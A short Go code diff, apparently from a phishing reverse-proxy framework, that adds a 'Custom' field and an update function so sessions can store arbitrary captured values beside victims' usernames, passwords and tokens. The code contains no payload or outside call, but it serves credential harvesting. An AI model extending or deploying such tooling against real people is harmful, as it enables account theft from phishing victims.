@@ -16,6 +16,7 @@ type Session struct {
 	LandingURL string                       `json:"landing_url"`
 	Username   string                       `json:"username"`
 	Password   string                       `json:"password"`
+	Custom     map[string]string            `json:"custom"`
 	Tokens     map[string]map[string]*Token `json:"tokens"`
 	SessionId  string                       `json:"session_id"`
 	UserAgent  string                       `json:"useragent"`
@@ -50,6 +51,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		LandingURL: landing_url,
 		Username:   "",
 		Password:   "",
+		Custom:     make(map[string]string),
 		Tokens:     make(map[string]map[string]*Token),
 		SessionId:  sid,
 		UserAgent:  useragent,
@@ -106,6 +108,18 @@ func (d *Database) sessionsUpdatePassword(sid string, password string) error {
 		return err
 	}
 	s.Password = password
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Custom[name] = value
 	s.UpdateTime = time.Now().UTC().Unix()
 
 	err = d.sessionsUpdate(s.Id, s)
